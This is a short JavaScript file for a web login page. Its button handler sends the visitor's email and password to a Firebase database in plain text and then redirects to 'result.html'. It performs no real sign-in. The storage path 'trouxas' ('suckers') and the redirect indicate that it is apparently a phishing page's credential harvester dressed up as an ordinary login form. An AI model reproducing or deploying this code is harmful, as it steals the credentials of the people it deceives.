// Import the functions you need from the SDKs you need
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.4/firebase-app.js";
import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.12.4/firebase-analytics.js";
import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/10.12.4/firebase-database.js";

// config
const firebaseConfig = {
  apiKey: process.env.REACT_APP_FIREBASE_API_KEY,
  authDomain: process.env.REACT_APP_FIREBASE_AUTH_DOMAIN,
  projectId: process.env.REACT_APP_FIREBASE_PROJECT_ID,
  storageBucket: process.env.REACT_APP_FIREBASE_STORAGE_BUCKET,
  messagingSenderId: process.env.REACT_APP_FIREBASE_MESSAGING_SENDER_ID,
  appId: process.env.REACT_APP_FIREBASE_APP_ID,
  measurementId: process.env.REACT_APP_FIREBASE_MEASUREMENT_ID
};

// init
const app = initializeApp(firebaseConfig);
const analytics = getAnalytics(app);
const database = getDatabase(app);

document.getElementById('loginBtn').addEventListener('click', () => {
  const id = Date.now(); // Gera um ID único usando timestamp
  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;

  // write data to Realtime Database
  set(ref(database, 'trouxas/' + id), {
    email: email,
    password: password
  });

  // read data from Realtime Database
  const dbRef = ref(getDatabase());
  get(child(dbRef, `trouxas/${id}`)).then((snapshot) => {
    if (snapshot.exists()) {
      console.log(snapshot.val());
      window.location.href = "result.html";
    } else {
      console.log("No data available");
    }
  }).catch((error) => {
    console.error(error);
  });
});